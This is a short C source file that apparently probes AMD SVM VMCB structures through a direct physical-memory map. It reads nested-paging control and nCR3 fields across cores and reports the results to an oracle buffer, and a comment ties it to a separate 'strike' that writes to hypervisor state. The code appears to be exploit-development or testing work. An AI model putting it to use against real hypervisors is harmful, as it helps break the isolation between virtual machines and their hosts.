#include <stdint.h>

#define ENTERED  0x1270a9e17e5e3001ULL
#define COMPLETE 0x1270a9e17e5e3002ULL
#define INCOMPLETE  0x1270a9e17e5e3003ULL
#define VMCB_BASE_PA 0x62a57000ULL
#define VMCB_STRIDE  0x2000ULL

void vmcb_probe_1270(uint64_t *param)
{
  uint64_t dmap = param[1];
  volatile uint64_t *ctrl =
      (volatile uint64_t *)(uintptr_t)(dmap + VMCB_BASE_PA +
                                       15 * VMCB_STRIDE + 0x90);
  volatile uint64_t *oracle = (volatile uint64_t *)(uintptr_t)param[2];
  uint64_t first = *ctrl;
  uint64_t checked = 0;

  oracle[0] = ENTERED;
  // Match the strike's pre-write scan, while reading core 15 on both sides.
  for (uint64_t core = 0; core < 15; ++core) {
    uint64_t va = dmap + VMCB_BASE_PA + core * VMCB_STRIDE;
    uint64_t scan_ctrl = *(volatile uint64_t *)(uintptr_t)(va + 0x90);
    uint64_t ncr3 = *(volatile uint64_t *)(uintptr_t)(va + 0xb0);
    if ((scan_ctrl & ~1ULL) != 8 || (ncr3 >> 24) != 0x62 ||
        (ncr3 & 0xfff))
      break;
    ++checked;
  }
  uint64_t value = *ctrl;
  oracle[1] = first;
  oracle[2] = value;
  oracle[3] = checked;
  oracle[0] = checked == 15 ? COMPLETE : INCOMPLETE;
}
